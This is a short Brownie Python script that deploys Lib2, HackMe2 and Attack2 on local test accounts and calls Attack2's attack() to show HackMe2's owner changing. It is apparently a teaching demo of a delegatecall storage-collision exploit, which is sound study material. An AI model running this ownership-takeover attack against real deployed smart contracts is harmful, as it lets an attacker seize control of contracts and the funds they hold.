from brownie import accounts, Lib2, Attack2, HackMe2


def main():

    # Examples from DelegateCall2.sol
    lib2 = Lib2.deploy({"from": accounts[0]})
    print(f"Accounts[0] deployed Lib2 at {lib2}")

    hm2 = HackMe2.deploy(lib2.address, {"from": accounts[0]})
    print(f"Accounts[0] deployed HackMe2 at {hm2}")

    print(f"HackMe2 owner is {hm2.owner()}")

    att2 = Attack2.deploy(hm2.address, {"from": accounts[1]})
    print(f"Accounts[1] deployed Attack2 at {att2}")

    tx = att2.attack({"from": accounts[1]})
    tx.wait(1)
    print(f"Now, HackMe2 owner is {hm2.owner()}")
